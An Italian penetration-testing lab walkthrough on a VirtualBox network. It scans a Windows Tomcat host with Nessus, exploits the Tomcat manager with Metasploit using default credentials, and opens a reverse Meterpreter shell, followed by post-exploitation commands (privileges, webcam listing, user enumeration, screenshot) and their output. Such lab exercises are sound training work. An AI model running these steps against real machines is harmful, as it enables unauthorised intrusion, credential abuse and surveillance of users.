Fase 1: Avvio dei servizi su Windows 10

Sulla macchina Windows 10, avvia i servizi necessari:
    Apri il Pannello di Controllo → Programmi e funzionalità → Attiva o disattiva funzionalità di Windows
    Abilita Internet Information Services (IIS) e Servizi World Wide Web
    Scarica e installa Apache Tomcat (versione 8.x o 9.x)
    Avvia Tomcat eseguendo startup.bat dalla cartella bin di Tomcat
    Verifica che Tomcat sia in esecuzione su http://192.168.200.200:8080

Fase 2: Vulnerability Scanning con Nessus

Da Kali Linux:
bash

# Avvia Nessus
sudo systemctl start nessusd

# Apri il browser e vai su https://127.0.0.1:8834
# Effettua il login con le tue credenziali Nessus

Configurazione scan Nessus:
    Crea un nuovo scan → Basic Network Scan
    Imposta:
        Name: Windows 10 Tomcat Scan
        Targets: 192.168.200.200
    Vai alla scheda Discovery → seleziona Port Scanning → aggiungi porta 8080
    Avvia lo scan

Fase 3: Exploit Tomcat con Metasploit

Da Kali Linux, apri una terminale:
bash

msfconsole

Configurazione exploit:
msf

use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.200.200
set RPORT 8080
set USERNAME tomcat
set PASSWORD tomcat
set TARGETURI /manager
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.200.100
set LPORT 7777
exploit

Se non funziona con credenziali default, prova:
msf

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.200.200
set RPORT 8080
set USERNAME admin
set PASSWORD admin
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.200.100
set LPORT 7777
exploit

Fase 4: Raccolta informazioni con Meterpreter

Una volta ottenuta la sessione Meterpreter (sessions -i 1), esegui:

# Info di sistema
meterpreter > sysinfo

# Utente corrente
meterpreter > getuid

# Privilegi
meterpreter > getprivs

# Processi in esecuzione
meterpreter > ps

# Webcam
meterpreter > webcam_list

# Navigare nei file
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users

# Shell interattiva
meterpreter > shell
C:\> hostname
C:\> whoami
C:\> net user
C:\> exit

---

meterpreter > getuid
Server username: DESKTOP-9K1O4BT$
meterpreter > sysinfo
Computer        : DESKTOP-9K1O4BT
OS              : Windows 8 6.2 (amd64)
Architecture    : x64
System Language : it_IT
Meterpreter     : java/windows
meterpreter > ipconfig

Interface  1
============
Name         : lo - Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  2
============
Name         : eth0 - Microsoft Kernel Debug Network Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295


Interface  3
============
Name         : eth1 - Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:0c:ea:80
MTU          : 1500
IPv4 Address : 192.168.200.200
IPv4 Netmask : 255.255.255.0


Interface  4
============
Name         : net0 - Microsoft Teredo Tunneling Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295


Interface  5
============
Name         : net1 - Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:c0a8:c8c8
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  6
============
Name         : eth2 - Intel(R) PRO/1000 MT Desktop Adapter-WFP Native MAC Layer LightWeight Filter-0000
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295


Interface  7
============
Name         : eth3 - Intel(R) PRO/1000 MT Desktop Adapter-QoS Packet Scheduler-0000
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295


Interface  8
============
Name         : eth4 - Intel(R) PRO/1000 MT Desktop Adapter-WFP 802.3 MAC Layer LightWeight Filter-0000
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295

meterpreter > screenshot
Screenshot saved to: /home/kali/WYWBNbnj.jpeg

meterpreter > pwd
C:\tomcat7
meterpreter > ls
Listing: C:\tomcat7
===================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100776/rwxrwxrw-  57896  fil   2017-08-11 13:23:46 +0200  LICENSE
100776/rwxrwxrw-  1275   fil   2017-08-11 13:23:46 +0200  NOTICE
100776/rwxrwxrw-  9195   fil   2017-08-11 13:23:46 +0200  RELEASE-NOTES
100776/rwxrwxrw-  16671  fil   2017-08-11 13:23:46 +0200  RUNNING.txt
040776/rwxrwxrw-  8192   dir   2024-07-12 12:23:42 +0200  bin
040776/rwxrwxrw-  4096   dir   2024-07-12 12:31:07 +0200  conf
040776/rwxrwxrw-  8192   dir   2024-07-12 12:23:42 +0200  lib
040776/rwxrwxrw-  16384  dir   2026-07-28 09:12:53 +0200  logs
040776/rwxrwxrw-  4096   dir   2026-07-28 11:07:20 +0200  temp
040776/rwxrwxrw-  4096   dir   2026-07-28 11:07:18 +0200  webapps
040776/rwxrwxrw-  0      dir   2024-07-12 12:31:07 +0200  work

meterpreter > run post/windows/gather/checkvm
[!] SESSION may not be compatible with this module:
[!]  * unloadable Meterpreter extension: stdapi_net
[*] Checking if the target is a Virtual Machine ...
[+] This is a VirtualBox Virtual Machine
